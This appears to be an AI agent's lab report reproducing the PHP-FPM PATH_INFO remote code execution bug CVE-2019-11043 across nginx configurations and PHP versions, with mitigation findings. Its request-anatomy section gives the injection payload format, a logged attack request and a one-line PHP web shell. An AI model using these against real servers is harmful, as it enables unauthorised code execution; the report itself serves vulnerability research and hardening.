# Alternative FPM RCE: CVE-2019-11043 (PHP-FPM `env_path_info` underflow) — lab reproduction

Run ID: `fpm_alt_rce_20261023T084957Z`
Date: 2026-10-23 (UTC), 08:49–11:50
Scope: PHP-FPM + nginx path-info underflow, **separate from CVE-2026-109618/109619**.
Isolation: dedicated docker network `fpmalt_net` (10.88.88.0/24); all containers named `fpmalt-*`;
host ports 294xx (29421–29427, 29431–29435, 29441–29443, 29451–29457, 29461–29464).
No shared lab (`b2fpm8426`, `b2fpm8511`, `b1mw8426`, `b1ctl8426`, ports 29356/29358, …) was
touched, restarted or reconfigured. No push/commit/PR was made.

---

## 1. Headline result

**CVE-2019-11043 is reproducible end-to-end in this lab — unauthenticated RCE as `www-data`
(uid 33) — but only with a config that sets `PATH_INFO` and has *no* script-existence check.**
The task's "typical distro config" (`fastcgi_split_path_info` + `try_files $fastcgi_script_name =404`
+ `PATH_INFO`) and the real Debian/Ubuntu `snippets/fastcgi-php.conf` are **not exploitable** in
this lab; stock nginx has no PHP handler at all.

| Config | PHP 7.1.32 | 7.2.23 | 7.2.24 | 7.3.10 | 7.3.11 | 7.4.33 | 8.4.26 | nginx |
|---|---|---|---|---|---|---|---|---|
| **A** split + `try_files $fastcgi_script_name =404` + `PATH_INFO` | 404 / no | 404 / no | 404 / no | 404 / no | 404 / no | 404 / no | 404 / no | 1.31.8 |
| **B** split + `PATH_INFO`, **no try_files** (minimal common) | **RCE** | **RCE** | 200 / no | **RCE** | 200 / no | 200 / no | 200 / no | 1.31.8 |
| **C1** stock nginx default (no PHP location) | – | – | – | – | – | – | – | 1.31.8 |
| **C2** `location ~ \.php$` only (no split, no PATH_INFO) | – | 404 / no | – | – | – | – | – | 1.31.8 |
| **C3** Debian/Ubuntu `fastcgi-php.conf` (split + try_files, **no PATH_INFO**) | 404 / no | 404 / no | – | 404 / no | – | – | – | 1.31.8 |
| **D** = B on nginx **1.17.10** (2019-era) | **RCE** | **RCE** | – | **RCE** | – | – | – | 1.17.10 |
| **E1** = B with `cgi.fix_pathinfo=0` | – | 404 / no | – | – | – | – | – | 1.31.8 |
| **E2** `PATH_TRANSLATED` instead of `PATH_INFO` | – | 200 / no | – | – | – | – | – | 1.31.8 |
| **E3** `PATH_INFO` set, **no `fastcgi_split_path_info`** (empty value) | – | **RCE** | – | – | – | – | – | 1.31.8 |

`no` = public PoC detector reports *"no qsl candidates found, invulnerable"* (base status 200 or 404,
no 5xx at any QSL 1500–1950 step 5). `404` = request never reaches PHP.

Every RCE row was verified on a **freshly restarted FPM container with `/tmp/a` deleted**, after
proving the baseline `?a=id` did *not* execute (see §6). Command proof: `id` → `uid=33(www-data)`,
hostname, and a marker file written inside the FPM container.

---

## 2. Lab inventory (exact)

| Role | Image | Digest | Runtime |
|---|---|---|---|
| FPM 7.1.32 | `php:7.1.32-fpm` | `sha256:ddf651cfffdcaa9bc9a2cd4b82e7c81c009416c190975f314e31910e49ec1966` | `PHP 7.1.32 (cli) (built: Oct 24 2019 05:05:05)` |
| FPM 7.2.23 | `php:7.2.23-fpm` | `sha256:c443903b7c482eca0f4fe5c3cee80f0dc0ed00196ccc6eda45077067706d5fec` | `PHP 7.2.23 (built: Oct 24 2019 03:27:01)` |
| FPM 7.2.24 (fixed) | `php:7.2.24-fpm` | `sha256:8451ce66994c1cfbe5d823e6767cb425ac2d721ac31a33f9f808675578ee53a3` | `PHP 7.2.24 (built: Oct 25 2019 04:29:43)` |
| FPM 7.3.10 | `php:7.3.10-fpm` | `sha256:3405ecb4e90b887a246650f0cffe3d2d54359d6f89af094d85fab97e3375d64a` | `PHP 7.3.10 (built: Oct 24 2019 01:39:20)` |
| FPM 7.3.11 (fixed) | `php:7.3.11-fpm` | `sha256:0cf9ade8de8c4e2b8935c0bdc06c012ed0a1002111083c93dc5c47b92161f0a4` | `PHP 7.3.11 (built: Oct 25 2019 02:33:33)` |
| FPM 7.4.33 (control) | `php:7.4.33-fpm` | `sha256:3ac7c8c74b2b047c7cb273469d74fc0d59b857aa44043e6ea6a0084372811d5b` | `PHP 7.4.33 (built: Nov 15 2022)` |
| FPM 8.4.26 (control) | `php:8.4.26-fpm` | `sha256:f5431b57bda75455d5271967cc6b67df8f0d0b943832756e0c78eccdc98767dd` | `PHP 8.4.26 (built: Oct 21 2026)` |
| nginx current | `nginx:alpine` | `sha256:060849a174666c53439dc7cecbf8f67e225c7cbfb1a44ca97915d9a172a81e6d` | `nginx/1.31.8` |
| nginx 2019 | `nginx:1.17.10-alpine` | `sha256:763e7f0188e378fef0c761854552c70bbd817555dc4de029681a2e972e25e30e` | `nginx/1.17.10` |

FPM pools: stock `php:*-fpm` `www.conf` + `zz-docker.conf` (`listen = 9000`, `pm = dynamic`,
`pm.max_children = 5`, `clear_env = no`). Only override mounted:

```ini
# conf/php/zz-lab.ini   sha256 53ddd5415a1bbfc1ef9440f11e5bcd7b3f1a0fc6732af3e6e328f1be2bc99d54
cgi.fix_pathinfo=1
expose_php=On
```

`php-fpm -i` confirms effective `cgi.fix_pathinfo => 1 => 1` (and `0 => 0` on the E1 pool).
Docroot: `/var/www/html` and `/srv/www/<tag>` both mounted (same file), containing only:

```php
<?php
header('X-Lab: fpmalt');
echo "FPMALT-OK ".PHP_VERSION."\n";
```

PoC: `github.com/neex/phuip-fpizdam` @ `86bc456bd5d53c77ad54a2252dcaaf1345b1a483`
(2019-11-12), built with Go 1.22.5, **unmodified** source.
Binary sha256 `fd605df097193a396757f1e1bebf61191d14b1c8086496dc82abbdf4b5f33396`.

---

## 3. Exact nginx configurations

Config files and hashes:

```
a4ff35e8c3a938c13612f7c9b4f101cea3473a0b0d5edfd62a9e576d97019cb1  conf/nginxA.conf
fdecaf5debbfcf7a285c291a737ae19a7bda6cb39abf3833bf69e2a1346fe272  conf/nginxB.conf
782f752854864949742fdfd25614626b15607781bb3af7a564dd3c42eea771bd  conf/nginxC.conf
a528986c1259ba2b0311249758c22ee423fcdee5e6bcac49b73e94581315443c  conf/nginxD.conf
848372773f91a0351fce38b0ccce2f85394bfb3b07869fa4e309ebb87045d5f3  conf/nginxE.conf
a686ee2ed3fa8e35c86fc6ff171995e468411a12996c3d1e75ab68fca3c7e667  conf/nginxE3.conf
```

### A — "typical distro-style" (split + try_files + PATH_INFO), one server per PHP version

```nginx
server {
    listen 8082;                       # host 29452 -> PHP 7.2.23
    server_name _;
    root /srv/www/7223;
    index index.php;
    location ~ [^/]\.php(/|$) {
        fastcgi_split_path_info ^(.+?\.php)(/.*)$;
        try_files $fastcgi_script_name =404;
        include fastcgi_params;                       # REQUEST_URI, DOCUMENT_URI, SCRIPT_NAME...
        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
        fastcgi_param PATH_INFO $fastcgi_path_info;   # after REQUEST_URI (precondition 4)
        fastcgi_pass fpmalt-7223:9000;
    }
}
```

### B — minimal common tutorial (split + PATH_INFO, **no** existence check)

Identical to A with the `try_files` line removed. This is the widely copied "how to run PHP on
nginx" snippet that omits the script-existence check.

### C1 — stock nginx default

`nginx:alpine`'s own `conf.d/default.conf`, unmodified behaviour: `root /srv/stock; index index.html;
location / { }` and the PHP `location` blocks **commented out**. No FastCGI at all.

### C2 — plain `location ~ \.php$`

```nginx
location ~ \.php$ {
    include fastcgi_params;
    fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
    fastcgi_pass fpmalt-7223:9000;
}
```
No `split_path_info`, no `PATH_INFO`; `/index.php/anything` does not match → 404.

### C3 — Debian/Ubuntu `snippets/fastcgi-php.conf` equivalent (split + try_files, **no PATH_INFO**)

```nginx
location ~ [^/]\.php(/|$) {
    fastcgi_split_path_info ^(.+?\.php)(/.*)$;
    try_files $fastcgi_script_name =404;
    include fastcgi_params;
    fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
    fastcgi_pass fpmalt-<tag>:9000;
}
```
(Debian's real snippet also has `set $path_info $fastcgi_path_info;` but never forwards it as
`PATH_INFO`; the `set` line is not security-relevant.)

### D — config B served by nginx 1.17.10 (era-correct)

Same text as B, `image: nginx:1.17.10-alpine`.

### E1/E2/E3 — variants

* E1: B, but FPM with `cgi.fix_pathinfo=0`.
* E2: `fastcgi_param PATH_TRANSLATED $document_root$fastcgi_path_info;` **instead of** `PATH_INFO`.
* E3: `fastcgi_param PATH_INFO $fastcgi_path_info;` **without** any `fastcgi_split_path_info`
  (so `PATH_INFO` is structurally empty).

---

## 4. Request anatomy and raw HTTP evidence

The PoC injects one php.ini directive per request by sending a PATH_INFO value that starts a new
line (so PHP's ini parser treats the rest as a directive) and by tuning the query-string length so
php-fpm's `*path_info = 0` underflow NUL lands on the FastCGI variable-name boundary:

```
path_info = "/PHP_VALUE\n" + <setting> + ";" * (34 - 11 - len(setting))     # PosOffset = 34
URI       = "/index.php" + percent_encode(path_info, keep "/;=")
query     = "a=<cmd>" + "Q" * (qsl - delta/2 - len(prefix))                 # delta = 2 per \n
Headers   : D-Pisos: 8("=" * pisos)D
            Ebut: mamku tvoyu
            User-Agent: Mozilla/5.0
```

Exact request line as logged by nginx (variant B, detection phase, trimmed):

```
GET /index.php/PHP_VALUE%0Asession.auto_start=1;;;?QQQQ…(1759 Q) HTTP/1.1
```

Single self-contained raw-socket replay (`replay.py`, `raw/replay_E3_session_autostart_SUCCESS.txt`),
qsl=1760, pisos=99, on a restarted 7.2.23 container:

```
HTTP/1.1 200 OK
Server: nginx/1.31.8
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/7.2.23
Set-Cookie: PHPSESSID=603612e3491317347aa7ec080fd64f26; path=/
X-Lab: fpmalt

FPMALT-OK 7.2.23
```

That `Set-Cookie` can only exist if `session.auto_start=1` reached PHP through the corrupted
FastCGI variable — the PATH_INFO→`PHP_VALUE` injection, with no application code involved.
Replay is worker-dependent: at qsl=1760 → 3/6 successful, at qsl=1755 → 0/6 (the 1755 detector
candidate is a false positive), matching a 5-worker pool.

After the full PoC attack, the injected `auto_prepend_file=a` (+ `include_path=/tmp`) persists in
the affected worker, so a plain request executes commands:

```
GET /index.php?a=id;hostname;echo+FPMALT-PWN-... 
→ uid=33(www-data) gid=33(www-data) groups=33(www-data)
  1f0e631a6042
  FPMALT-PWN-B_7.1.32
```

The only file the exploit creates is `/tmp/a` **inside the PHP-FPM container** (created by the
beched `error_log`/`extension_dir` trick), outside any docroot, as the staging for the shell:

```
-rw-r--r-- 1 www-data www-data 198 /tmp/a
<?php echo `$_GET[a]`;return;?>
```

No third-party application file write, no LFI, no upload was used. `php://input` as
`auto_prepend_file` is *not* reachable with this PoC: PosOffset=34 leaves only 23 characters per
injected setting, and `auto_prepend_file=php://input` is 30. `allow_url_include=1` (19 chars) fits,
but the prepend target does not.

Header-based injection does **not** work (checked): sending `PHP_VALUE: auto_prepend_file=php://input`
and `PHP_ADMIN_VALUE: allow_url_include=1` as HTTP headers returns the normal page and creates no
`/tmp/a` — nginx maps them to `HTTP_PHP_VALUE`/`HTTP_PHP_ADMIN_VALUE`, which FPM ignores.

---

## 5. Full result table (per-case evidence)

Clean-room table `raw/clean_results.tsv` (baseline = `?a=id` before the attack, on restarted container):

| case | port | container | baseline uid | code | detector | after-attack uid hit |
|---|---|---|---|---|---|---|
| A_tryfiles_7.2.23 | 29452 | fpmalt-7223 | none | 200 | base 404, no QSL | – |
| B_7.1.32 | 29421 | fpmalt-7123 | none | 200 | QSL [1755 1760 1765] | hit 1 |
| B_7.2.23 | 29422 | fpmalt-7223 | none | 200 | QSL [1755 1760 1765] | hit 1 |
| B_7.3.10 | 29424 | fpmalt-7310 | none | 200 | QSL [1755 1760 1765] | hit 1 |
| D_nginx117_7.1.32 | 29441 | fpmalt-7123 | none | 200 | QSL [1755 1760 1765] | hit 1 |
| D_nginx117_7.2.23 | 29442 | fpmalt-7223 | none | 200 | QSL [1755 1760 1765] | hit 1 |
| D_nginx117_7.3.10 | 29443 | fpmalt-7310 | none | 200 | QSL [1755 1760 1765] | hit 2 |
| E3_nosplit_pathinfo | 29464 | fpmalt-7223-e3 | none | 200 | QSL [1755 1760 1765] | hit 1 |
| C3_distro_snippet_7.2.23 | 29434 | fpmalt-7223 | none | 200 | base 404, no QSL | – |

Detector signal in every vulnerable row: base status 200, then
`Status code 502 for qsl=1765, adding as a candidate` → `Possible QSLs: [1755 1760 1765]`, and the
attack phase settles on `--qsl 1760 --pisos N` (N varied 67/99/131/211 between runs — the PoC
brute-forces the `D-Pisos` header length because it depends on the worker's env-buffer layout).
No `500` was observed in this lab; the 5xx signal was always `502` (worker abort), and `qsl=1755`
never produced a working injection despite being listed as a candidate.

All-version detector sweep (`raw/*_onlyqsl.log`, `raw/clean/*_onlyqsl.log`):

| PHP | A (try_files) | B (no try_files) |
|---|---|---|
| 7.1.32 | base 404 → invulnerable | **vulnerable, RCE** |
| 7.2.23 | base 404 → invulnerable | **vulnerable, RCE** |
| 7.2.24 | base 404 → invulnerable | base 200 → invulnerable |
| 7.3.10 | base 404 → invulnerable | **vulnerable, RCE** |
| 7.3.11 | base 404 → invulnerable | base 200 → invulnerable |
| 7.4.33 | base 404 → invulnerable | base 200 → invulnerable |
| 8.4.26 | base 404 → invulnerable | base 200 → invulnerable |

Notable: 7.4.33 and 8.4.26 *do* execute PHP through this config (baseline 200, `FPMALT-OK`) — they
are simply not affected, which is the correct negative control.

Fixed-version check: 7.2.24 and 7.3.11 run the same config, same nginx, same detector, and produce
no 5xx at any QSL → the fix is in the FPM binary, not a lab artefact.

Variants (7.2.23 unless noted):

| Variant | Result |
|---|---|
| E1 `cgi.fix_pathinfo=0` | base 404, no QSL → **not vulnerable** |
| E2 `PATH_TRANSLATED` instead of `PATH_INFO` | base 200, no QSL → **not vulnerable** |
| E3 `PATH_INFO` set but no `fastcgi_split_path_info` | **vulnerable, RCE** (fresh container: `uid=33(www-data)`, hostname `31a9587d8688`, marker `FPMALT-PWN-E3_nosplit_pathinfo`) |
| header `PHP_VALUE` / `PHP_ADMIN_VALUE` | ignored (no effect, no `/tmp/a`) |

E3 is worth flagging: `fastcgi_split_path_info` is **not strictly required** if `PATH_INFO` is
already structurally empty. In that case php-fpm derives `path_info` from `SCRIPT_NAME` (which
carries the `/PHP_VALUE\n…` payload), and the NUL write still lands on the env-var name boundary.
This is a non-stock, uncommon config, but it means posture checks that only grep for
`fastcgi_split_path_info` can miss a vulnerable deployment; the decisive conditions are
`PATH_INFO` being forwarded and the absence of a script-existence check.

---

## 6. Controlling the per-worker confound

The injection lives in the FPM **worker** (5 workers, `pm.max_children=5`) and is not global. A
naive sequence "attack port X, then attack port Y" can make Y look exploitable because a worker
infected during X answers Y's check request. This actually happened during the first sweep: with
shared containers, D (nginx 1.17) and E3 appeared to pass while a previously infected worker was
still serving. The matrix was therefore re-run as follows for every RCE claim:

1. `docker restart <fpm container>` (new master/workers → per-worker ini state gone);
2. `docker exec <container> rm -f /tmp/a`;
3. 5× `GET /index.php?a=id` → must **not** contain `uid=`, recorded as `before=none`;
4. run the unmodified PoC;
5. retry `GET /index.php?a=id` up to 40× and record the first `uid=33(www-data)`.

`raw/clean_results.tsv` shows `before=none` and `hit=1..2` for all RCE rows. Marker files written
by the injected command exist inside the containers:

```
/tmp/fpmalt_pwn_B_7.1.32, /tmp/fpmalt_pwn_B_7.2.23, /tmp/fpmalt_pwn_B_7.3.10,
/tmp/fpmalt_pwn_D_nginx117_7.1.32, /tmp/fpmalt_pwn_D_nginx117_7.2.23,
/tmp/fpmalt_pwn_E3_nosplit_pathinfo
```

Additional methodology note: `docker exec` runs as root, so its `id` output is irrelevant; the uid
proof is the response of the injected `id` command inside the FPM worker (`www-data`, 33).

PoC quirk seen once: on the first (shared-container) sweep against nginx 1.17.10 the unmodified
PoC printed `Success!` and then spun forever in its cleanup loop (`?a=…` rewrite of `/tmp/a`),
needing a 10-minute timeout per case. After the container restart the same runs completed with
`Done!` in under a second, so this is PoC flakiness against a stateful worker, not a difference in
exploitability; the RCE classification was taken only from `Success!` + fresh-container `uid` proof.

---

## 7. Config classification

| Class | Example | Vulnerable here? | Why |
|---|---|---|---|
| **Stock nginx default** | `nginx:alpine` `conf.d/default.conf` | **No** | no `fastcgi_pass` at all; `.php` is served as static/404 |
| **Stock distro nginx + distro PHP snippet** | Debian/Ubuntu `snippets/fastcgi-php.conf` (split + `try_files`, no `PATH_INFO`) | **No** | `PATH_INFO` is never forwarded; `try_files` also rejects malformed paths |
| **Common copy-paste tutorial ("PHP-FPM on nginx")** | split + `fastcgi_param PATH_INFO $fastcgi_path_info;` and **no** existence check | **Yes** | attacker makes `PATH_INFO` empty via `%0A`, php-fpm underflows and writes a NUL into the FastCGI env name; `PHP_VALUE` injection follows |
| **Distro-style + PATH_INFO, with `try_files $fastcgi_script_name =404`** | variant A | **No** | the newline breaks `fastcgi_split_path_info`, so `$fastcgi_script_name` becomes the full URI and `try_files` returns 404 before FastCGI |
| **Non-stock: empty `PATH_INFO` without split** | variant E3 | **Yes** | php-fpm derives path_info from `SCRIPT_NAME`; payload still reaches the env buffer |

So the bug is **config-dependent**, not a stock/out-of-the-box FPM RCE. It requires a web-server
config that forwards `PATH_INFO` and lets non-existent script paths reach FastCGI.

---

## 8. Relation to CVE-2026-109618/109619

This is a different defect class and a different era:

* 2019 bug: logic/pointer-arithmetic underflow in `fpm_main.c`'s `PATH_INFO` handling; trigger is a
  *web-server configuration contract*, not a malformed FastCGI record; fixed in 7.1.33/7.2.24/7.3.11.
* 2026 bugs (109618/109619): separate FastCGI/FPM issues investigated elsewhere in this project;
  nothing in this lab's requests or results exercises them, and no shared container/service was used.
* Practical consequence: on a modern PHP (7.4+/8.x) CVE-2019-11043 is dead regardless of nginx
  config; on legacy 7.0–7.3 the exposure is entirely determined by the nginx snippet, and the
  single most effective mitigation is a script-existence check (`try_files $uri =404` or
  `try_files $fastcgi_script_name =404`) plus not forwarding `PATH_INFO` unless needed.

---

## 9. Artifacts

```
/tmp/opencode/research/fpm_alt_rce_20261023T084957Z/
├── report.md                      this file
├── setup_lab.sh                   lab creation (network, FPM, nginx A/B/C/D)
├── setup_variants.sh              E1/E2/E3
├── run_matrix.py, run_matrix2.py  detector/attack sweeps
├── clean_run.sh                   restart + baseline + attack + uid verification
├── replay.py                      raw-socket single-request injection replay
├── conf/                          nginxA/B/C/D/E/E3.conf, php/zz-lab.ini, php-nofix/zz-lab.ini
├── docroot/<tag>/index.php        minimal app marker
├── poc/phuip-fpizdam/             unmodified public PoC (commit 86bc456)
├── poc/phuip-fpizdam.bin          built binary (sha256 fd605df0…)
├── logs/B_7223_attack.log         first manual end-to-end run
└── raw/
    ├── clean_results.tsv          clean-room matrix (baseline + hit counts)
    ├── matrix.jsonl               full sweep incl. negative cases
    ├── *_onlyqsl.log, *_attack.log
    ├── clean/*_post.txt           `uid`/hostname/marker responses
    └── replay_E3_session_autostart_SUCCESS.txt
```

Container inventory (left running for inspection, isolated network `fpmalt_net`):
`fpmalt-7123, fpmalt-7223, fpmalt-7224, fpmalt-7310, fpmalt-7311, fpmalt-7433, fpmalt-8426,
fpmalt-7223-nofix, fpmalt-7223-e3` (FPM, no published ports) and
`fpmalt-nginx-a, -b, -c, -d, -e, -e3` (127.0.0.1:294xx only).

Shared services were not touched; nothing was pushed or committed.
